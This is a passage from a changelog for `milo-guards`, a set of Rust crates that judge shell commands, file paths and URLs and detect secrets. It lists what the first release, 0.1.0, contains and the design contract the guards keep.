  workspace's; the front door `milo-guards` keeps that one.
- The README's logo is named by its absolute URL, so crates.io shows it.

## 0.1.0 (2026-11-05)

The first release, on crates.io as `milo-guards` with the guards behind it.

- `milo-guards-shell`: judges a shell line, POSIX shell, PowerShell or cmd,
  parsed with tree-sitter 0.26; `effect` says whether it only reads and
  where, `explain` how the line was read; inline Python and JavaScript are
  read with the `code` reader (feature `inline`, on by default).
- `milo-guards-file`: judges one read or write of a path.
- `milo-guards-url`: judges a URL by the host a parser reads, its scheme
  and its user-info.
- `milo-guards-secrets`: finds credentials and personal data in a text,
  with the spans to scrub, never the secret.
- `milo-guards-code`: reads Python and JavaScript for the acts the code is
  certain to do; not a guard.
- `milo-guards-core`: the `Paths` a call is judged against, `Protected`
  paths in the caller's words, `Assessment` and `Finding` with `instead`,
  the `RuleName` trait, and a test kit behind the `testing` feature.

Every guard keeps the contract: no I/O and no environment reads,
deterministic, no policy, what cannot be read is risky, never panics.
